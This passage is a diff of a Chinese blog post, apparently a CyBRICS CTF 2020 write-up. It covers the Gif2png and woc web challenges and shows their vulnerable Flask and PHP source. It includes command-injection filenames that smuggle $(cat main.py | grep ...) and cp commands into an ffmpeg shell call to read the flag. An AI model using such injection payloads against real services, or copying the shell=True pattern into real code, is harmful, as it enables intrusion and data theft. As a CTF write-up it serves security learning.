@@ -466,34 +466,287 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 <h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>签到不谈。<br><img src="/2020/07/26/CyBRICS-CTF-2020/0.PNG" class="lazyload" data-srcset="0.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>首先是源码审计.</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect, url_for, flash, send_from_directory</span><br><span class="line"><span class="keyword">from</span> flask_bootstrap <span class="keyword">import</span> Bootstrap</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> secure_filename</span><br><span class="line"><span class="keyword">import</span> filetype</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ALLOWED_EXTENSIONS = &#123;<span class="string">'gif'</span>&#125;</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'UPLOAD_FOLDER'</span>] = <span class="string">'./uploads'</span></span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'********************************'</span></span><br><span class="line">app.config[<span class="string">'MAX_CONTENT_LENGTH'</span>] = <span class="number">500</span> * <span class="number">1024</span>  <span class="comment"># 500Kb</span></span><br><span class="line">ffLaG = <span class="string">"cybrics&#123;********************************&#125;"</span></span><br><span class="line">Bootstrap(app)</span><br><span class="line">logging.getLogger().setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allowed_file</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'.'</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">'.'</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() <span class="keyword">in</span> ALLOWED_EXTENSIONS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_file</span><span class="params">()</span>:</span></span><br><span class="line">    logging.debug(request.headers)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'file'</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">            logging.debug(<span class="string">'No file part'</span>)</span><br><span class="line">            flash(<span class="string">'No file part'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        file = request.files[<span class="string">'file'</span>]</span><br><span class="line">        <span class="keyword">if</span> file.filename == <span class="string">''</span>:</span><br><span class="line">            logging.debug(<span class="string">'No selected file'</span>)</span><br><span class="line">            flash(<span class="string">'No selected file'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> allowed_file(file.filename):</span><br><span class="line">            logging.debug(<span class="string">f'Invalid file extension of file: <span class="subst">&#123;file.filename&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Invalid file extension'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file.content_type != <span class="string">"image/gif"</span>:</span><br><span class="line">            logging.debug(<span class="string">f'Invalid Content type: <span class="subst">&#123;file.content_type&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Content type is not "image/gif"'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bool(re.match(<span class="string">"^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$"</span>, file.filename)) <span class="keyword">or</span> <span class="string">".."</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">            logging.debug(<span class="string">f'Invalid symbols in filename: <span class="subst">&#123;file.content_type&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Invalid filename'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> file <span class="keyword">and</span> allowed_file(file.filename):</span><br><span class="line">            filename = secure_filename(file.filename)</span><br><span class="line">            file.save(os.path.join(app.config[<span class="string">'UPLOAD_FOLDER'</span>], file.filename))</span><br><span class="line"></span><br><span class="line">            mime_type = filetype.guess_mime(<span class="string">f'uploads/<span class="subst">&#123;file.filename&#125;</span>'</span>)</span><br><span class="line">            <span class="keyword">if</span> mime_type != <span class="string">"image/gif"</span>:</span><br><span class="line">                logging.debug(<span class="string">f'Invalid Mime type: <span class="subst">&#123;mime_type&#125;</span>'</span>)</span><br><span class="line">                flash(<span class="string">'Mime type is not "image/gif"'</span>, <span class="string">'danger'</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"></span><br><span class="line">            uid = str(uuid.uuid4())</span><br><span class="line">            os.mkdir(<span class="string">f"uploads/<span class="subst">&#123;uid&#125;</span>"</span>)</span><br><span class="line"></span><br><span class="line">            logging.debug(<span class="string">f"Created: <span class="subst">&#123;uid&#125;</span>. Command: ffmpeg -i 'uploads/<span class="subst">&#123;file.filename&#125;</span>' \"uploads/<span class="subst">&#123;uid&#125;</span>/%03d.png\""</span>)</span><br><span class="line"></span><br><span class="line">            command = subprocess.Popen(<span class="string">f"ffmpeg -i 'uploads/<span class="subst">&#123;file.filename&#125;</span>' \"uploads/<span class="subst">&#123;uid&#125;</span>/%03d.png\""</span>, shell=<span class="literal">True</span>)</span><br><span class="line">            command.wait(timeout=<span class="number">15</span>)</span><br><span class="line">            logging.debug(command.stdout)</span><br><span class="line"></span><br><span class="line">            flash(<span class="string">'Successfully saved'</span>, <span class="string">'success'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'result'</span>, uid=uid))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"form.html"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/result/&lt;uid&gt;/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">(uid)</span>:</span></span><br><span class="line">    images = []</span><br><span class="line">    <span class="keyword">for</span> image <span class="keyword">in</span> os.listdir(<span class="string">f"uploads/<span class="subst">&#123;uid&#125;</span>"</span>):</span><br><span class="line">        mime_type = filetype.guess(str(Path(<span class="string">"uploads"</span>) / uid / image))</span><br><span class="line">        <span class="keyword">if</span> image.endswith(<span class="string">".png"</span>) <span class="keyword">and</span> mime_type <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> mime_type.EXTENSION == <span class="string">"png"</span>:</span><br><span class="line">            images.append(image)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"result.html"</span>, uid=uid, images=images)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/uploads/&lt;uid&gt;/&lt;image&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">image</span><span class="params">(uid, image)</span>:</span></span><br><span class="line">    logging.debug(request.headers)</span><br><span class="line">    dir = str(Path(app.config[<span class="string">'UPLOAD_FOLDER'</span>]) / uid)</span><br><span class="line">    print(dir)</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(dir, image)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(413)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_entity_too_large</span><span class="params">(error)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"File is too large"</span>, <span class="number">413</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'localhost'</span>, port=<span class="number">5000</span>, debug=<span class="literal">False</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+<pre><code class="python">import logging
+import re
+import subprocess
+import uuid
+from pathlib import Path
+
+from flask import Flask, render_template, request, redirect, url_for, flash, send_from_directory
+from flask_bootstrap import Bootstrap
+import os
+from werkzeug.utils import secure_filename
+import filetype
+
+
+ALLOWED_EXTENSIONS = {&#39;gif&#39;}
+
+app = Flask(__name__)
+app.config[&#39;UPLOAD_FOLDER&#39;] = &#39;./uploads&#39;
+app.config[&#39;SECRET_KEY&#39;] = &#39;********************************&#39;
+app.config[&#39;MAX_CONTENT_LENGTH&#39;] = 500 * 1024  # 500Kb
+ffLaG = &quot;cybrics{********************************}&quot;
+Bootstrap(app)
+logging.getLogger().setLevel(logging.DEBUG)
+
+def allowed_file(filename):
+    return &#39;.&#39; in filename and filename.rsplit(&#39;.&#39;, 1)[1].lower() in ALLOWED_EXTENSIONS
+
+
+@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def upload_file():
+    logging.debug(request.headers)
+
+    if request.method == &#39;POST&#39;:
+        if &#39;file&#39; not in request.files:
+            logging.debug(&#39;No file part&#39;)
+            flash(&#39;No file part&#39;, &#39;danger&#39;)
+            return redirect(request.url)
+
+        file = request.files[&#39;file&#39;]
+        if file.filename == &#39;&#39;:
+            logging.debug(&#39;No selected file&#39;)
+            flash(&#39;No selected file&#39;, &#39;danger&#39;)
+            return redirect(request.url)
+
+        if not allowed_file(file.filename):
+            logging.debug(f&#39;Invalid file extension of file: {file.filename}&#39;)
+            flash(&#39;Invalid file extension&#39;, &#39;danger&#39;)
+            return redirect(request.url)
+
+        if file.content_type != &quot;image/gif&quot;:
+            logging.debug(f&#39;Invalid Content type: {file.content_type}&#39;)
+            flash(&#39;Content type is not &quot;image/gif&quot;&#39;, &#39;danger&#39;)
+            return redirect(request.url)
+
+        if not bool(re.match(&quot;^[a-zA-Z0-9_\-. &#39;\&quot;\=\$\(\)\|]*$&quot;, file.filename)) or &quot;..&quot; in file.filename:
+            logging.debug(f&#39;Invalid symbols in filename: {file.content_type}&#39;)
+            flash(&#39;Invalid filename&#39;, &#39;danger&#39;)
+            return redirect(request.url)
+
+        if file and allowed_file(file.filename):
+            filename = secure_filename(file.filename)
+            file.save(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], file.filename))
+
+            mime_type = filetype.guess_mime(f&#39;uploads/{file.filename}&#39;)
+            if mime_type != &quot;image/gif&quot;:
+                logging.debug(f&#39;Invalid Mime type: {mime_type}&#39;)
+                flash(&#39;Mime type is not &quot;image/gif&quot;&#39;, &#39;danger&#39;)
+                return redirect(request.url)
+
+            uid = str(uuid.uuid4())
+            os.mkdir(f&quot;uploads/{uid}&quot;)
+
+            logging.debug(f&quot;Created: {uid}. Command: ffmpeg -i &#39;uploads/{file.filename}&#39; \&quot;uploads/{uid}/%03d.png\&quot;&quot;)
+
+            command = subprocess.Popen(f&quot;ffmpeg -i &#39;uploads/{file.filename}&#39; \&quot;uploads/{uid}/%03d.png\&quot;&quot;, shell=True)
+            command.wait(timeout=15)
+            logging.debug(command.stdout)
+
+            flash(&#39;Successfully saved&#39;, &#39;success&#39;)
+            return redirect(url_for(&#39;result&#39;, uid=uid))
+
+    return render_template(&quot;form.html&quot;)
+
+
+@app.route(&#39;/result/&lt;uid&gt;/&#39;)
+def result(uid):
+    images = []
+    for image in os.listdir(f&quot;uploads/{uid}&quot;):
+        mime_type = filetype.guess(str(Path(&quot;uploads&quot;) / uid / image))
+        if image.endswith(&quot;.png&quot;) and mime_type is not None and mime_type.EXTENSION == &quot;png&quot;:
+            images.append(image)
+
+    return render_template(&quot;result.html&quot;, uid=uid, images=images)
+
+
+@app.route(&#39;/uploads/&lt;uid&gt;/&lt;image&gt;&#39;)
+def image(uid, image):
+    logging.debug(request.headers)
+    dir = str(Path(app.config[&#39;UPLOAD_FOLDER&#39;]) / uid)
+    print(dir)
+    return send_from_directory(dir, image)
+
+
+@app.errorhandler(413)
+def request_entity_too_large(error):
+    return &quot;File is too large&quot;, 413
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&#39;localhost&#39;, port=5000, debug=False, threaded=True)</code></pre>
 <p>注意到执行ffmpeg有个变量拼接。我们的file.filename可控。不过需要经过前面几层检验。简单看可以发现一方面限制了<br>后缀（取最后一个. 后字符检测是否为gif）另外限制了可用字符。不过这些字符已经够用了。</p>
 <p>首先我的思路是去找ffmpeg的可用flag.通过<code>-h</code>列出一些flag后。我注意到这样几个</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-report             generate a report</span><br><span class="line">-filter_script filename  <span class="built_in">read</span> stream filtergraph description from a file</span><br><span class="line">-metadata string=string  add metadata</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">-report             generate a report
+-filter_script filename  read stream filtergraph description from a file
+-metadata string=string  add metadata</code></pre>
 <p>这里我主要是寻找跟文件有关的选项。其中report会在当前目录生成一个log文件。filter_script可以读取一个文件内容作为stream filter. -metadata 可以添加一组键值。加入到输出的metadata中。</p>
 <p>不过本地跑起来简单尝试下后。会发现因为我们不可用<code>/</code>字符。所以想要控制路径是做不到的。我们必须要让包含flag的信息输出到uploads的沙盒下。而注意到题目<code>/uploads/{uid}/</code>下的内容并没有像其他两个路由那样做文件类型检查。所以我们是可以直接访问的。</p>
 <p>因此<code>-report</code>无法使用。因为它只能在当前目录生成报告。而<code>-filter_script</code>假如搭配<code>-report</code>倒是可以把读取文件内容时的错误信息输出到日志中。但是因为日志读不了所以也不可行。</p>
 <p>于是我关注点就集中到了<code>-metadata</code>上。我们可以构造这样的命令闭合引号并且执行。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i <span class="string">'uploads/logo.gif'</span> -metadata language=$(cat main.py| grep ffLaG |base64)  -metadata abc=<span class="string">'.gif'</span> <span class="string">"uploads/&#123;uid&#125;/%03d.png"</span></span><br></pre></td></tr></table></figure>
+<pre><code class="bash">ffmpeg -i &#39;uploads/logo.gif&#39; -metadata language=$(cat main.py| grep ffLaG |base64)  -metadata abc=&#39;.gif&#39; &quot;uploads/{uid}/%03d.png&quot;</code></pre>
 <p>从输出结果上看是成功执行命令了的。但是本地测试发现一个问题。输出的png读不到其metadata属性。</p>
 <p>简单的查阅了下文档以及谷歌后我推测应该是因为ffmpeg的metadata选项不支持png.不过文档里我发现视频文件是肯定可以修改增加metadata的。因此当我尝试将上面的命令改为输出成avi后。是可以通过exiftool读取到metadata中的language的。<br><img src="/2020/07/26/CyBRICS-CTF-2020/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>那么我们现在只需要一个强迫转换输出类型的flag. 再次查文档发现了<code>-f fmt              force format</code>。<br>所以最终payload如下。我们只需在传好logo.gif后传gif文件并以如下作为文件名</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logo.gif<span class="string">' -metadata language=$(cat main.py| grep ffLaG |base64) -f avi  -metadata abc='</span>.gif</span><br></pre></td></tr></table></figure>
+<pre><code class="bash">logo.gif&#39; -metadata language=$(cat main.py| grep ffLaG |base64) -f avi  -metadata abc=&#39;.gif</code></pre>
 <p>首先我们保证了结尾最后的<code>.</code>末尾是<code>gif</code>绕过后缀检查。之后执行命令时将会把main.py中的ffLaG变量值保存到输出的language metadata中。本地跑起来的话。会发现在沙盒下最终生成了名为<code>%03d.png</code>的avi类型文件。并且可以用exiftool获取到其metadata。</p>
 <p>本地打通的话去远程打肯定就没问题了。这里打远程时稍微多发了几次包。最终获取到图片并得到flag<br><img src="/2020/07/26/CyBRICS-CTF-2020/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
 <p>看着这个flag我高度怀疑自己不是预期做的……搞不好可以很简单解决掉。</p>
 <p>ps:<br>佛了。不会就我去看ffmpeg的flags了吧……虽然做法很有趣但是未免太傻了……别人的payload:<br><code>&#39;$(cp main.py uploads$(pwd | cut -c1)GENERATED_UID$(pwd | cut -c1))&#39;.gif</code><br>wtcltcl。忘记用pwd拼接目录了。bash script都白写了。</p>
 <h2 id="woc"><a href="#woc" class="headerlink" title="woc"></a>woc</h2><p>这道题目最主要的就是用代码混淆视线。所以关键在于一定要找到真正可以利用的漏洞代码。<br>首先注意到一个似乎可以利用的地方。在calc.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!@$_SESSION[<span class="string">'userid'</span>]) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (!@$_GET[<span class="string">'template'</span>]) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$userid = $_SESSION[<span class="string">'userid'</span>];</span><br><span class="line">$template = $_GET[<span class="string">'template'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">'#^[a-f0-9]&#123;8&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;4&#125;-[a-f0-9]&#123;12&#125;$#s'</span>, $template)) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!is_file(<span class="string">"calcs/$userid/templates/$template.html"</span>)) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (trim(@$_POST[<span class="string">'field'</span>])) &#123;</span><br><span class="line">    $field = trim($_POST[<span class="string">'field'</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s'</span>, $field)) &#123;</span><br><span class="line">        $value = <span class="string">"BAD"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (@$_POST[<span class="string">'share'</span>]) &#123;</span><br><span class="line">            $calc = uuid();</span><br><span class="line">            file_put_contents(<span class="string">"calcs/$userid/$calc.php"</span>, <span class="string">"&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n"</span> . file_get_contents(<span class="string">"inc/calclib.html"</span>) . file_get_contents(<span class="string">"calcs/$userid/templates/$template.html"</span>));</span><br><span class="line">            redir(<span class="string">"?p=sharelink&amp;calc=$calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                $value = <span class="keyword">eval</span>(<span class="string">"return $field;"</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable $e) &#123;</span><br><span class="line">                $value = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($value) &amp;&amp; !is_string($value)) &#123;</span><br><span class="line">                $value = <span class="string">"ERROR"</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $value = (string)$value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;var preloadValue = "</span> . json_encode($value) . <span class="string">";&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="string">"inc/calclib.html"</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">"calcs/$userid/templates/$template.html"</span>;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+if (!@$_SESSION[&#39;userid&#39;]) {
+    redir(&quot;.&quot;);
+} elseif (!@$_GET[&#39;template&#39;]) {
+    redir(&quot;.&quot;);
+}
 
+$userid = $_SESSION[&#39;userid&#39;];
+$template = $_GET[&#39;template&#39;];
+
+if (!preg_match(&#39;#^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$#s&#39;, $template)) {
+    redir(&quot;.&quot;);
+}
+if (!is_file(&quot;calcs/$userid/templates/$template.html&quot;)) {
+    redir(&quot;.&quot;);
+}
+
+if (trim(@$_POST[&#39;field&#39;])) {
+    $field = trim($_POST[&#39;field&#39;]);
+
+    if (!preg_match(&#39;#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s&#39;, $field)) {
+        $value = &quot;BAD&quot;;
+    } else {
+        if (@$_POST[&#39;share&#39;]) {
+            $calc = uuid();
+            file_put_contents(&quot;calcs/$userid/$calc.php&quot;, &quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n&quot; . file_get_contents(&quot;inc/calclib.html&quot;) . file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;));
+            redir(&quot;?p=sharelink&amp;calc=$calc&quot;);
+        } else {
+            try {
+                $value = eval(&quot;return $field;&quot;);
+            } catch (Throwable $e) {
+                $value = null;
+            }
+
+            if (!is_numeric($value) &amp;&amp; !is_string($value)) {
+                $value = &quot;ERROR&quot;;
+            } else {
+                $value = (string)$value;
+            }
+        }
+    }
+
+    echo &quot;&lt;script&gt;var preloadValue = &quot; . json_encode($value) . &quot;;&lt;/script&gt;&quot;;
+}
+
+require &quot;inc/calclib.html&quot;;
+require &quot;calcs/$userid/templates/$template.html&quot;;</code></pre>
 <p>第一想法肯定是利用那个eval.不过这里字符实在是太限制了。我很快就发现根本无法构造出<code>INF</code>,<code>NAN</code>以外等等字符并取单。因此得尝试变化思路。</p>
 <p>注意到题目功能。整体上提供了一个假注册登录功能用来记录session.同时允许我们上传新template.我们可以根据calc.php中所传template参数选择template。前往newtemplate.php。发现其限制了我们template的代码中不能含有<code>&lt;?</code>且必须包含它要求的id标签。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!@$_SESSION[<span class="string">'userid'</span>]) &#123;</span><br><span class="line">    redir(<span class="string">"."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$userid = $_SESSION[<span class="string">'userid'</span>];</span><br><span class="line"></span><br><span 